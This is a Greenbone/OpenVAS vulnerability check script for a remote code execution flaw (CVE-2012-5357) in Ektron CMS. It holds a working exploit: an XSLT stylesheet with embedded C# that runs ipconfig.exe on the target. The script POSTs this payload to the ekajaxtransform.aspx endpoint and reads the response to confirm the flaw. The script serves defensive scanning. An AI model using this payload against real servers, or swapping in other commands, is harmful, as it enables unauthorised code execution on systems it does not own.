# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103624");
  script_version("2023-02-24T10:20:04+0000");
  script_tag(name:"last_modification", value:"2023-02-24 10:20:04 +0000 (Fri, 24 Feb 2023)");
  script_tag(name:"creation_date", value:"2012-12-10 11:13:54 +0100 (Mon, 10 Dec 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-11-18 17:39:00 +0000 (Sat, 18 Nov 2017)");

  script_cve_id("CVE-2012-5357");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Ektron CMS < 8.02 Service Pack 5 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/runs_windows");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Ektron CMS is prone to a remote code execution (RCE)
  ulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Successful exploits will allow remote attackers to execute
  arbitrary code within the context of the affected application. Failed attacks may cause denial of
  service conditions.");

  script_tag(name:"affected", value:"Ektron CMS prior to version 8.02 Service Pack 5.");

  script_tag(name:"solution", value:"Update to version 8.02 Service Pack 5 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56816");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("url_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_asp( port:port ) )
  exit( 0 );

host = http_host_name( port:port );

ex =
'<?xml version="1.0"?>\n' +
 '<xsl:stylesheet version="1.0"\n' +
 'xmlns:xsl="http://www.w3.org/1999/XSL/Transform"\n' +
 'xmlns:msxsl="urn:schemas-microsoft-com:xslt"\n' +
 'xmlns:user="http://mycompany.com/mynamespace">\n' +
 '<msxsl:script language="C#" implements-prefix="user">\n' +
 '<![CDATA[\n' +
  'public string xml()\n' +
  '{\n' +
   'System.Diagnostics.Process proc = new System.Diagnostics.Process();\n' +
   'proc.StartInfo.UseShellExecute = false;\n' +
   'proc.StartInfo.RedirectStandardOutput = true;\n' +
   'proc.StartInfo.FileName = "ipconfig.exe";\n' +
   'proc.Start();\n' +
   'proc.WaitForExit();\n' +
   'return proc.StandardOutput.ReadToEnd();\n' +
  '}\n' +
 ']]>\n' +
 '</msxsl:script>\n' +
 '<xsl:template match="/">\n' +
 '<xsl:value-of select="user:xml()"/>\n' +
 '</xsl:template>\n' +
 '</xsl:stylesheet>';

ex_encoded = "xml=AAA&xslt=" + urlencode( str:ex );
len = strlen( ex_encoded );

foreach dir( make_list_unique( "/cms", "/cms400min", "/cms400.net", "/cms400", http_cgi_dirs( port:port ) ) ) {
  if( dir == "/" )
    dir = "";

  url = dir + "/WorkArea/ContentDesigner/ekajaxtransform.aspx";

  headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );

  req = http_post_put_req( port:port, url:url, data:ex_encoded, add_headers:headers, referer_url: "/" );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( eregmatch( pattern:"Windows.IP..onfiguration", string:res ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
